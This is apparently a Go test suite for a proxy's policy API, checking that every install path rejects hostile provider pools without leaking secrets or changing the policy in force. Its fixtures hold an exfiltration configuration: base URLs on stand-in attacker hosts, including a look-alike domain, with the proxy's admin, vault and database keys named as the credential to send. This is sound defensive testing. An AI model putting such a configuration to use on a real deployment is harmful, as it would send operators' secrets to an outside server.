package api

import (
	"bytes"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"

	"github.com/yatuk/tamga/internal/policy"
	"github.com/yatuk/tamga/internal/policy/history"
)

// installSentinel stands for a secret in the proxy's environment.
const installSentinel = "SENTINEL-install-path-5b90ee"

const installGoodYAML = "version: \"1.0\"\nname: in-force\nrules: {}\n"

// hostilePoolYAML is the hole as reported: a pool on a server of the
// author's own, naming one of the proxy's secrets as its key.
func hostilePoolYAML() string {
	return "version: \"1.0\"\nname: hostile\nproviders:\n  pools:\n    openai:\n      providers:\n" +
		"        - name: exfil\n          base_url: https://user:" + installSentinel + "@collector.evil.example\n" +
		"          api_key_env: TAMGA_ADMIN_KEY\n          priority: 1\n"
}

// Variants that each break one rule only.
func hostileVariants() map[string]string {
	pool := func(baseURL, key string) string {
		return "version: \"1.0\"\nname: hostile\nproviders:\n  pools:\n    openai:\n      providers:\n" +
			"        - name: exfil\n          base_url: " + baseURL + "\n          api_key_env: " + key + "\n"
	}
	return map[string]string{
		"host and name": hostilePoolYAML(),
		"name only":     pool("https://api.openai.com", "TAMGA_VAULT_KEY"),
		"lower case":    pool("https://api.openai.com", "tamga_admin_key"),
		"database url":  pool("https://api.openai.com", "DATABASE_URL"),
		"host only":     pool("https://collector.evil.example", "OPENAI_API_KEY"),
		"look-alike":    pool("https://api.openai.com.evil.example", "OPENAI_API_KEY"),
	}
}

type installLog struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (l *installLog) Write(p []byte) (int, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.b.Write(p)
}

func (l *installLog) String() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.b.String()
}

type installRig struct {
	t      *testing.T
	cfg    Config
	path   string
	store  *policy.PolicyStore
	hist   *history.FileStore
	before *policy.Policy
	logs   *installLog
	mux    http.Handler
}

func newInstallRig(t *testing.T) *installRig {
	t.Helper()
	for _, name := range []string{"TAMGA_ADMIN_KEY", "TAMGA_VAULT_KEY", "TAMGA_DB_URL", "DATABASE_URL", "OPENAI_API_KEY"} {
		t.Setenv(name, installSentinel)
	}
	logs := &installLog{}
	prev := log.Logger
	log.Logger = zerolog.New(logs)
	t.Cleanup(func() { log.Logger = prev })

	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(path, []byte(installGoodYAML), 0o644); err != nil {
		t.Fatal(err)
	}
	p0, err := policy.LoadFromFile(path)
	if err != nil {
		t.Fatal(err)
	}
	g := &installRig{t: t, path: path, store: policy.NewPolicyStore(p0), hist: newFileStore(t), before: p0, logs: logs}
	g.cfg = Config{AdminKey: "admin", PolicyPath: path, PolicyStore: g.store, PolicyHistory: g.hist, DefaultOrgID: "org-1"}
	g.mux = testMux(g.cfg)
	return g
}

func (g *installRig) do(method, target, contentType, body string) (int, string) {
	g.t.Helper()
	r := httptest.NewRequest(method, "/api/v1"+target, strings.NewReader(body))
	r.Header.Set("X-Tamga-Admin-Key", "admin")
	if contentType != "" {
		r.Header.Set("Content-Type", contentType)
	}
	w := httptest.NewRecorder()
	g.mux.ServeHTTP(w, r)
	b, _ := io.ReadAll(w.Result().Body)
	return w.Code, string(b)
}

// rejected asserts what every install path owes: an error status, the field
// named, no value anywhere, the policy in force untouched, and the file on
// disk as wantFile.
func (g *installRig) rejected(what string, status int, answer, wantFile string, nameField bool) {
	g.t.Helper()
	if status < 400 {
		g.t.Errorf("%s: status %d, want a rejection: %s", what, status, answer)
	}
	if nameField && !strings.Contains(answer, "providers.pools.openai.providers[0].") {
		g.t.Errorf("%s: the answer does not name the field: %s", what, answer)
	}
	for _, leak := range []string{installSentinel, "collector.evil.example"} {
		if strings.Contains(answer, leak) {
			g.t.Errorf("%s: the answer carries a value (%s): %s", what, leak, answer)
		}
		if strings.Contains(g.logs.String(), leak) {
			g.t.Errorf("%s: the log carries a value (%s):\n%s", what, leak, g.logs.String())
		}
	}
	if g.store.GetPolicy() != g.before {
		g.t.Errorf("%s: the policy in force changed to %q", what, g.store.GetPolicy().Name)
	}
	got, err := os.ReadFile(g.path)
	if err != nil {
		g.t.Fatal(err)
	}
	if string(got) != wantFile {
		g.t.Errorf("%s: the policy file changed:\n%s", what, got)
	}
}

func TestInstallPaths_PutValidateSimulateRejectHostilePools(t *testing.T) {
	for name, y := range hostileVariants() {
		g := newInstallRig(t)
		status, answer := g.do(http.MethodPut, "/policies", "application/x-yaml", y)
		g.rejected("PUT "+name, status, answer, installGoodYAML, true)

		jsonBody := `{"yaml":` + jsonString(y) + `,"sample_text":"hello"}`
		status, answer = g.do(http.MethodPut, "/policies", "application/json", jsonBody)
		g.rejected("PUT json "+name, status, answer, installGoodYAML, true)

		status, answer = g.do(http.MethodPost, "/policies/validate", "application/x-yaml", y)
		g.rejected("validate "+name, status, answer, installGoodYAML, true)

		status, answer = g.do(http.MethodPost, "/policies/simulate", "application/json", jsonBody)
		g.rejected("simulate "+name, status, answer, installGoodYAML, true)
	}
}

func jsonString(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, c := range s {
		switch c {
		case '"':
			b.WriteString(`\"`)
		case '\\':
			b.WriteString(`\\`)
		case '\n':
			b.WriteString(`\n`)
		default:
			b.WriteRune(c)
		}
	}
	b.WriteByte('"')
	return b.String()
}

// The file on disk already holds a hostile pool (edited by hand, or left by
// an older version). Neither a reload nor a change to custom entities, which
// rewrites and reloads the file, brings it in.
func TestInstallPaths_ReloadAndCustomEntitiesRejectAHostileFile(t *testing.T) {
	g := newInstallRig(t)
	hostile := hostilePoolYAML()
	if err := os.WriteFile(g.path, []byte(hostile), 0o644); err != nil {
		t.Fatal(err)
	}

	status, answer := g.do(http.MethodPost, "/policies/reload", "", "")
	g.rejected("reload", status, answer, hostile, true)

	status, answer = g.do(http.MethodPost, "/policies/custom-entities", "application/json", `{"name":"badge","pattern":"B-[0-9]{4}","action":"WARN"}`)
	g.rejected("custom entity add", status, answer, hostile, true)

	status, answer = g.do(http.MethodDelete, "/policies/custom-entities/badge", "", "")
	g.rejected("custom entity delete", status, answer, hostile, true)
}

// Rollback and approval used to write the file and then find out. They now
// look first: the file stays byte for byte what it was, the policy in force
// stays, and a refused proposal is still open.
func TestInstallPaths_RollbackAndApproveLookBeforeWriting(t *testing.T) {
	for name, y := range hostileVariants() {
		g := newInstallRig(t)
		rev, err := g.hist.AppendRevision(history.Revision{Author: "mallory", Message: "old", YAML: y})
		if err != nil {
			t.Fatal(err)
		}
		status, answer := g.do(http.MethodPost, "/policies/rollback/"+rev.ID, "", "")
		g.rejected("rollback "+name, status, answer, installGoodYAML, true)
		if status != http.StatusUnprocessableEntity {
			t.Errorf("rollback %s: status %d, want 422", name, status)
		}
		if revs, _ := g.hist.ListRevisions(); len(revs) != 1 {
			t.Errorf("rollback %s: a revision was recorded for a refused rollback", name)
		}

		prop, err := g.hist.CreateProposal(history.Proposal{Author: "mallory", Message: "please", YAML: y})
		if err != nil {
			t.Fatal(err)
		}
		status, answer = g.do(http.MethodPost, "/policies/proposals/"+prop.ID+"/approve", "", "")
		g.rejected("approve "+name, status, answer, installGoodYAML, true)
		if status != http.StatusUnprocessableEntity {
			t.Errorf("approve %s: status %d, want 422", name, status)
		}
		if after, _ := g.hist.GetProposal(prop.ID); after.Status != "open" || after.ApprovedBy != "" {
			t.Errorf("approve %s: the proposal is %q (approved by %q), want it still open", name, after.Status, after.ApprovedBy)
		}
		if revs, _ := g.hist.ListRevisions(); len(revs) != 1 {
			t.Errorf("approve %s: a revision was recorded for a refused proposal", name)
		}
	}
}

// The same paths still install a policy with a pool the rules allow.
func TestInstallPaths_AcceptAnAllowedPool(t *testing.T) {
	allowed := "version: \"1.0\"\nname: with-pool\nproviders:\n  pools:\n    anthropic:\n      providers:\n" +
		"        - name: primary\n          base_url: https://api.anthropic.com\n          api_key_env: ANTHROPIC_API_KEY\n          priority: 1\n"

	g := newInstallRig(t)
	if status, answer := g.do(http.MethodPut, "/policies", "application/x-yaml", allowed); status != http.StatusOK {
		t.Fatalf("PUT: %d %s", status, answer)
	}
	if g.store.GetPolicy().Name != "with-pool" {
		t.Fatal("PUT: not installed")
	}

	g = newInstallRig(t)
	rev, _ := g.hist.AppendRevision(history.Revision{Author: "a", YAML: allowed})
	if status, answer := g.do(http.MethodPost, "/policies/rollback/"+rev.ID, "", ""); status != http.StatusOK {
		t.Fatalf("rollback: %d %s", status, answer)
	}
	if g.store.GetPolicy().Name != "with-pool" {
		t.Fatal("rollback: not installed")
	}

	g = newInstallRig(t)
	prop, _ := g.hist.CreateProposal(history.Proposal{Author: "a", YAML: allowed})
	if status, answer := g.do(http.MethodPost, "/policies/proposals/"+prop.ID+"/approve", "", ""); status != http.StatusOK {
		t.Fatalf("approve: %d %s", status, answer)
	}
	if g.store.GetPolicy().Name != "with-pool" {
		t.Fatal("approve: not installed")
	}
	if strings.Contains(g.logs.String(), installSentinel) {
		t.Fatalf("the log carries a value:\n%s", g.logs.String())
	}
}
